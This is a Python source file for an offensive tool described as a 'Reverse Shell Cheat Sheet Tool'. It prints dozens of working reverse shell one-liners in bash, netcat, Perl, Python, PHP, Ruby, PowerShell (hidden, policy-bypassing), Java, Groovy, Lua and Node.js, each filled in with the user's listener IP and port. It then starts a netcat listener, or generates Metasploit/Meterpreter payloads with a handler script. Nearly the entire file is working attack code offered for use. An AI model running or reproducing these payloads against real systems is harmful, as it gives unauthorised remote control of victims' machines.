#!/usr/bin/env python3
import argparse, sys, os, re, socket, subprocess
from urllib import request
from random import choice
import signal

color = ['\033[95m', '\033[96m', '\033[36m', '\033[94m', '\033[92m', '\033[93m', '\033[91m']


def signal_handler(sig, frame):
    print('\nBye!')
    sys.exit(1)


def ask_listener():
    lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('10.255.255.255', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
    wan = None
    try:
        wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
    except:
        print('Could not automatically determine external IP address.')
        print('Please try again later or input manually!')
    print(f'{choice(color)}For LAN enter 1: {lan}')
    if wan:
        print(f'{choice(color)}For WAN enter 2: {wan}')
    print('Enter a custom IP address if none of the above are correct for you.')
    while True:
        cw = input('Which one do you want, LAN or WAN?: ')
        if cw == '1':
            ipp = lan
            break
        elif cw == '2' and wan:
            ipp = wan
            break
        try:
            socket.inet_aton(cw)
            ipp = cw
            break
        except socket.error:
            pass
        print('Invalid input.')
    while True:
        port = input("Select listening port: ")
        try:
            int(port)
            break
        except ValueError:
            print('Invalid input.')
    return ipp, port


def shell():
    ipp, port = ask_listener()

    # Keeping with the random colors, but adding color coding for different OS
    os_colors = {'windows': choice(color)}
    linux_color = choice(color)
    while linux_color == os_colors['windows']:
        linux_color = choice(color)
    os_colors['linux'] = linux_color
    both_color = choice(color)
    while both_color == os_colors['windows'] or both_color == os_colors['linux']:
        both_color = choice(color)
    os_colors['both'] = both_color
    print(linux_color, end='')
    print(r"""
╔BASH TCP═══════════════════════════════════════════
║ bash -i >& /dev/tcp/xxx/yyy 0>&1
╠═══════════════════════════════════════════════════
║ 0<&196;exec 196<>/dev/tcp/xxx/yyy; sh <&196 >&196 2>&196
╚═══════════════════════════════════════════════════
╔BASH UDP═════════════╦═════════════════════════════
║ Run Target Machine  ║ sh -i >& /dev/udp/xxx/yyy 0>&1
╚═════════════════════╩═════════════════════════════

╔Netcat Traditional═════════════════════════════════
║ nc -e /bin/sh xxx yyy
╚═══════════════════════════════════════════════════
╔Netcat OpenBSD═════════════════════════════════════
║ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx yyy >/tmp/f
╚═══════════════════════════════════════════════════
╔NCAT═══════════════════════════════════════════════
║ ncat xxx yyy -e /bin/bash
╠═══════════════════════════════════════════════════
║ ncat --udp xxx yyy -e /bin/bash
╚═══════════════════════════════════════════════════

╔AWK════════════════════════════════════════════════
║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
╚═══════════════════════════════════════════════════

╔NODEJS═════════════════════════════════════════════
║(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(yyy, "xxx", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
╠═══════════════════════════════════════════════════
║ require('child_process').exec('nc -e /bin/sh xxx yyy')
╠═══════════════════════════════════════════════════
║var x = global.process.mainModule.require
x('child_process').exec('nc xxx yyy -e /bin/bash')
╚═══════════════════════════════════════════════════

╔PERL═══════════════════════════════════════════════
║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""".replace("xxx", ipp).replace("yyy", port), end='')
    print(os_colors['both'], end='')
    print(r"""
╠═══════════════════════════════════════════════════
║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".replace("xxx", ipp).replace("yyy", port), end='')
    print(os_colors['windows'], end='')
    print(r"""
╠══════════════╦════════════════════════════════════
║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
╚══════════════╩════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
    print(os_colors['linux'], end='')
    print(r"""
╔PYTHON═════════════════════════════════════════════
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
╠═══════════════════════════════════════════════════
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".replace("xxx", ipp).replace("yyy", port), end='')
    print(os_colors['windows'], end='')
    print(r"""
╠══════════════╦════════════════════════════════════
║ Windows only ║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
╚══════════════╩════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
    print(os_colors['linux'], end='')
    print(r"""
╔PHP════════════════════════════════════════════════
║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
╚═══════════════════════════════════════════════════

╔RUBY═══════════════════════════════════════════════
║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""".replace("xxx", ipp).replace("yyy", port), end='')
    print(os_colors['windows'], end='')
    print(r"""
╠══════════════╦════════════════════════════════════
║ Windows only ║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
╠══════════════╬════════════════════════════════════
║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
╚══════════════╩════════════════════════════════════

╔POWERSHELL═════════════════════════════════════════
║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
╠═══════════════════════════════════════════════════
║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx',yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
╚═══════════════════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
    print(os_colors['linux'], end='')
    print(r"""
╔JAVA═══════════════════════════════════════════════
║ r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
╚═══════════════════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port), end='')
    print(os_colors['windows'], end='')
    print(r"""
╔JAVA for GROOVY════════════════════════════════════
║ String host="xxx";
int port=yyy;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
╚═══════════════════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
    print(os_colors['linux'], end='')
    print(r"""
╔LUA═════════╦══════════════════════════════════════
║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """.replace("xxx", ipp).replace("yyy", port), end='')
    print(os_colors['both'], end='')
    print(r"""
╠════════════╩══════╦═══════════════════════════════
║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
╚═══════════════════╩═══════════════════════════════""".replace("xxx", ipp).replace("yyy", port))

    print(f'{choice(color)}         |--Shell Spawning--|\n')
    print('For Linux shells use https://github.com/jonasw234/upgrade-tty to upgrade your TTY!\n')
    sudo_prefix = ''
    if os.geteuid() != 0 and int(port) < 1024:
        sudo_prefix = 'sudo '
    os.system(f'{sudo_prefix}nc -lvp {port}')


def payload():
    while True:
        ven = input('Enter payload: ')
        try:
            if int(ven) < 1 or int(ven) > 15:
                raise ValueError
            break
        except ValueError:
            print('Invalid input.')

    ipp, port = ask_listener()

    msfpc_format = None
    msfvenom_command = None
    msfvenom_extension = None
    msfvenom_extra = ''
    #Binaries
    if ven == '1':
        msfpc_format = 'elf'
    if ven == '2':
        msfpc_format = 'exe'
    if ven == '3':
        msfpc_format = 'macho'
    #Web Payloads
    if ven == '4':
        msfpc_format = 'php'
    if ven == '5':
        msfpc_format = 'asp'
    if ven == '6':
        msfpc_format = 'jsp'
    if ven == '7':
        msfpc_format = 'war'
    if ven == '8':
        msfvenom_command = 'nodejs/shell_reverse_tcp'
        msfvenom_extension = 'js'

    #Scripting
    if ven == '9':
        msfpc_format = 'python'
    if ven == '10':
        msfpc_format = 'bash'
    if ven == '11':
        msfpc_format = 'perl'
    if ven == '12':
        msfvenom_command = 'ruby/shell_reverse_tcp'
        msfvenom_extension = 'rb'

    #Shellcode
    if ven == '13':
        msfvenom_command = 'linux/x86/meterpreter/reverse_tcp'
        dil = input('Enter language: ')
        if dil.rstrip() == '':
            dil = 'raw'
        msfvenom_extra = f' -f {dil}'
        msfvenom_extension = dil
    if ven == '14':
        msfvenom_command = 'windows/meterpreter/reverse_tcp'
        dil = input('Enter language: ')
        if dil.rstrip() == '':
            dil = 'raw'
        msfvenom_extra = f' -f {dil}'
        msfvenom_extension = dil
    if ven == '15':
        msfvenom_command = 'osx/x86/shell_reverse_tcp'
        dil = input('Enter language: ')
        if dil.rstrip() == '':
            dil = 'raw'
        msfvenom_extra = f' -f {dil}'
        msfvenom_extension = dil

    if msfpc_format:
        msfpc = subprocess.run(['msfpc', msfpc_format, ipp, port], capture_output=True)
        print(msfpc.stdout.decode('utf-8'))
        spawn_shell = msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0]
    elif msfvenom_command and msfvenom_extension:
        payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
        os.system(f'msfvenom -p {msfvenom_command} LHOST={ipp} LPORT={port}{msfvenom_extra} > "{payload}"')
        print(f'Payload created: {os.getcwd()}/{payload}')
        msfvenom_rc = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}-{msfvenom_extension}.rc'
        with open(msfvenom_rc, 'w') as rc:
            rc.write(f"""#
# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{payload}'
#
use exploit/multi/handler
set PAYLOAD {msfvenom_command}
set LHOST {ipp}
set LPORT {port}
set ExitOnSession false
set EnableStageEncoding true
#set AutoRunScript 'post/windows/manage/migrate'
run -j""")
        spawn_shell = f'msfconsole -q -r {os.getcwd()}/{msfvenom_rc}'
        print('')
    else:
        print('Something went wrong and I don’t know what to do ...')
        sys.exit(1)

    print(f'{choice(color)}         |--Shell Spawning--|\n')
    sudo_prefix = ''
    if os.geteuid() != 0 and int(port) < 1024:
        sudo_prefix = 'sudo '
    os.system(f'{sudo_prefix}{spawn_shell}')


def banner():
    print(choice(color) + """
                                    ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
                                    ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
                                    ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─
                                            .:: 0xR ::.
                            .:: Reverse Shell Cheat Sheet Tool ::.
                                    .:: cyber-warrior.org ::.
                         .:: Heavily modified by Jonas A. Wendorf ::.
""")


def main(arg):
    parser = argparse.ArgumentParser()
    parser.add_argument('use', help='msf|shell')
    args = parser.parse_args()
    banner()
    if args.use == 'shell':
        shell()
    elif args.use == 'msf':
        print(choice(color) + """
                     _____________________________________________________

                                 Creating Metasploit Payloads
         ______________________________________________________________________________
        |              |                 |                       |                     |
        | #Binaries    |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
        |______________|_________________|_______________________|_____________________|
        |              |                 |                       |                     |
        | 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux based     |
        |              |                 |                       |                     |
        | 2) Windows   | 5) ASP          | 10) Bash              | 14) Windows based   |
        |              |                 |                       |                     |
        | 3) Mac       | 6) JSP          | 11) Perl              | 15) Mac based       |
        |              |                 |                       |                     |
        |              | 7) WAR          | 12) Ruby              |                     |
        |              |                 |                       |                     |
        |              | 8) Nodejs       |                       |                     |
        |______________|_________________|_______________________|_____________________|
""")
        payload()
    elif args.use != 'shell' and args.use != 'msf':
        print(choice(color) + 'Type "python shell.py -h" or "shell -h" for options')


if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    main(sys.argv[1:])
